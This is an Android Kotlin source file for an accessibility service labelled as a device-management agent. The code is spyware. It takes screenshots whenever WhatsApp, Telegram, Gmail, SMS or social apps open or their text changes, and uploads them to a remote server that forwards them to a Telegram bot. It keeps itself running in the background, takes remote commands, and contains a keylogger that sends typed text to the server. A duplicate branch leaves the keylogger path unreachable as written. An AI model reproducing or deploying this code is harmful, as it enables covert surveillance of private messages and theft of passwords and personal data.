package com.mdm.agent.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody

class MDMAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MDMAccessibility"
        
        @Volatile var autoScreenshotEnabled = false
        @Volatile private var lastScreenshotTime = 0L
        private const val SCREENSHOT_THROTTLE = 5000L  // 5 seconds between screenshots
        private const val SCREENSHOT_MIN_DELAY = 3000L  // 3 seconds after app opens
        
        // Apps to monitor for screenshots
        private val MONITORED_APPS = setOf(
            "com.whatsapp", "com.whatsapp.w4b",
            "com.telegram.messenger", "org.telegram.messenger",
            "com.google.android.gm", "com.android.mms",
            "com.facebook.katana", "com.instagram.android",
            "com.snapchat.android", "com.twitter.android"
        )
        
        fun setAutoScreenshot(enabled: Boolean) {
            autoScreenshotEnabled = enabled
            Log.i(TAG, "Auto-screenshot ${if (enabled) "ENABLED" else "DISABLED"}")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "✅ Accessibility Service Connected - Starting connection...")

        // Start MDMService for background persistence
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "MDMService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start MDMService: ${e.message}")
            // Fallback: connect directly from here
            connectDirectly()
        }
    }

    private fun connectDirectly() {
        Thread {
            try {
                Log.i(TAG, "📡 Connecting directly from AccessibilityService...")
                val apiClient = com.mdm.agent.data.remote.ApiClient(this)
                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
                val uploadManager = com.mdm.agent.data.remote.UploadManager(this)
                val socketManager = com.mdm.agent.data.remote.SocketManager(this)
                
                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")
                
                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                }
                
                val commandHandler = com.mdm.agent.data.remote.CommandHandler(this, apiClient, cryptoManager, socketManager, uploadManager)
                socketManager.setCommandHandler(commandHandler)
                socketManager.setCryptoManager(cryptoManager)
                socketManager.onCommandReceived = { data ->
                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
                    commandHandler.handleCommand(data)
                }
                
                socketManager.connect()
                Log.i(TAG, "🎉 Connected from AccessibilityService!")
                
                // Store in MainActivity for bot commands
                com.mdm.agent.MainActivity.setSocketManager(socketManager)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Direct connection failed: ${e.message}", e)
            }
        }.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    Log.d(TAG, "Window: $pkg / $cls")
                    
                    // Auto-screenshot: take screenshot when monitored app opens
                    if (autoScreenshotEnabled && pkg in MONITORED_APPS) {
                        val now = System.currentTimeMillis()
                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                            lastScreenshotTime = now
                            Log.i(TAG, "📸 Auto-screenshot: $pkg opened")
                            Handler(Looper.getMainLooper()).postDelayed({
                                takeAutoScreenshot(pkg)
                            }, SCREENSHOT_MIN_DELAY)
                        }
                    }
                }
            }
            
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // Auto-screenshot when text changes in monitored apps
                if (autoScreenshotEnabled) {
                    val pkg = event.packageName?.toString() ?: ""
                    if (pkg in MONITORED_APPS) {
                        val now = System.currentTimeMillis()
                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                            lastScreenshotTime = now
                            Log.i(TAG, "📸 Auto-screenshot: text changed in $pkg")
                            Handler(Looper.getMainLooper()).postDelayed({
                                takeAutoScreenshot(pkg)
                            }, 1000)  // 1 second delay to let text render
                        }
                    }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Content change - available for monitoring
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (com.mdm.agent.data.remote.DataCollectors.inputMonitoringActive) {
                    handleKeylogEvent(event)
                }
            }
        }
    }

    private fun handleKeylogEvent(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: ""
            if (text.isEmpty()) return
            
            val pkg = event.packageName?.toString() ?: "unknown"
            val now = System.currentTimeMillis()
            
            synchronized(com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer) {
                com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.append(text)
                
                if (now - com.mdm.agent.data.remote.DataCollectors.lastKeylogSend > 
                    com.mdm.agent.data.remote.DataCollectors.KEYLOG_THROTTLE) {
                    
                    val buffer = com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.toString().trim()
                    if (buffer.isNotEmpty()) {
                        com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.clear()
                        com.mdm.agent.data.remote.DataCollectors.lastKeylogSend = now
                        
                        Log.i(TAG, "⌨️ Keylog [$pkg]: $buffer")
                        
                        // Send to server
                        val sm = com.mdm.agent.MainActivity.getSocketManager()
                        if (sm != null && sm.isConnected) {
                            val data = org.json.JSONObject().apply {
                                put("type", "keylog")
                                put("package", pkg)
                                put("text", buffer)
                                put("timestamp", System.currentTimeMillis())
                            }
                            sm.sendFileExplorerData(data)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Keylog error: ${e.message}")
        }
    }

    private fun takeAutoScreenshot(packageName: String) {
        try {
            Log.i(TAG, "📸 Taking auto-screenshot for: $packageName")

            // Check if ScreenCaptureService is ready
            if (!ScreenCaptureService.isReady()) {
                Log.w(TAG, "⚠️ ScreenCapture not ready - MediaProjection permission not granted")
                return
            }

            Log.i(TAG, "✅ ScreenCapture is ready - taking screenshot!")

            // Take screenshot
            ScreenCaptureService.requestScreenshot(this) { file ->
                if (file != null && file.exists()) {
                    Log.i(TAG, "✅ Screenshot captured: ${file.absolutePath} (${file.length()} bytes)")

                    // ✅ Upload to bot using upload-media endpoint (NOT encrypted /data endpoint)
                    // The /data endpoint stores encrypted files but doesn't forward to Telegram.
                    // /api/device/upload-media forwards directly to the bot as a photo.
                    Thread {
                        try {
                            val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                            val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                            val url = "$serverUrl/api/device/upload-media"

                            val client = okhttp3.OkHttpClient.Builder()
                                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                                .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                                .writeTimeout(180, java.util.concurrent.TimeUnit.SECONDS)
                                .build()

                            val requestBody = okhttp3.MultipartBody.Builder()
                                .setType(okhttp3.MultipartBody.FORM)
                                .addFormDataPart("device_id", deviceId)
                                .addFormDataPart("command", "screenshot")
                                .addFormDataPart("file_type", "photo")
                                .addFormDataPart("file", file.name,
                                    file.asRequestBody("image/png".toMediaType()))
                                .build()

                            val request = okhttp3.Request.Builder().url(url).post(requestBody).build()
                            val response = client.newCall(request).execute()
                            if (response.isSuccessful) {
                                Log.i(TAG, "✅ Auto-screenshot uploaded to bot!")
                            } else {
                                Log.e(TAG, "❌ Upload failed: ${response.code}")
                            }
                            response.close()
                            // Clean up the screenshot file
                            file.delete()
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Failed to upload screenshot: ${e.message}")
                        }
                    }.start()
                } else {
                    Log.w(TAG, "⚠️ Screenshot file is null")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Auto-screenshot error: ${e.message}")
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        Log.i(TAG, "Accessibility service destroyed")
        super.onDestroy()
    }
}
